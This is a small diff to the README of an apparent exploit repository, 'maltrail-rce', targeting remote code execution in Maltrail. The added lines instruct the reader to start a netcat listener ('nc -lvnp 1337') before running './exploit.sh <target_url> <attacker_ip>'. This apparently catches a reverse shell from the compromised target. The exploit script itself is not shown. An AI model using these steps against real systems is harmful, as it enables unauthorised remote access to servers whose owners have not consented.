@@ -14,6 +14,12 @@ cd maltrail-rce
 chmod +x exploit.sh 
 ```
 
+make sure to start a listener before executing the exploit.sh 
+
+```
+nc -lvnp 1337
+```
+
 ```
 ./exploit.sh <target_url> <attacker_ip>
 ```
